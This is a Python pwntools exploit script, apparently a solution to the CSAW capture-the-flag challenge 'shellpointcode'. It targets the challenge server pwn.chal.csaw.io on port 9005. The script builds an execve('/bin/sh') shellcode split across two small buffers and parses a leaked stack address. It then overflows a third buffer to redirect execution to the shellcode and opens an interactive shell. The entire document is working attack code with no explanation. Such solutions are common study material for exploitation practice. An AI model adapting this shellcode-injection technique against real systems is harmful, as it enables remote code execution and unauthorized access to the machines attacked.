#!/usr/bin/env python2
from pwn import *
import sys
#from mypwntools import * # ~/workspace/tools/mypwntools
# shellcodes['binsh32']
# gethex(string)

#context.log_level = 'debug'
context(arch='amd64', os='linux')
context.terminal = ['tmux', 'splitw', '-h']

shellcode1 = '''
add rsp, 0x8
xor eax, eax
cdq
xor esi, esi
push rsp
pop rdi
mov al, 0x3b
syscall
'''

print(len(asm(shellcode1)))
#sys.exit()

p = process("./shellpointcode")
p = remote('pwn.chal.csaw.io', 9005)

"""
gdb.attach(p, '''
               set follow-fork-mode child
               # breakpoints
           '''
          )
          """

payload_buf1_15 = '\xf4' + 'A'*14
payload_buf1_15 = asm(shellcode1)[:15]

payload_buf2_15 = p64(0x0068732F6E69622F)

payload_buf3_11 = 'C' * 11

p.sendline(payload_buf1_15)
p.sendline(payload_buf2_15)
p.recvuntil('node.next: ')

nodenext = int(p.recvline()[2:],16)
print(hex(nodenext))

buf1_15 = nodenext + 0x28
buf2_15 = nodenext + 0x8
buf3_11 = nodenext - 0x13

target_addr = p64(buf1_15)
p.sendline(payload_buf3_11+target_addr)

p.interactive()

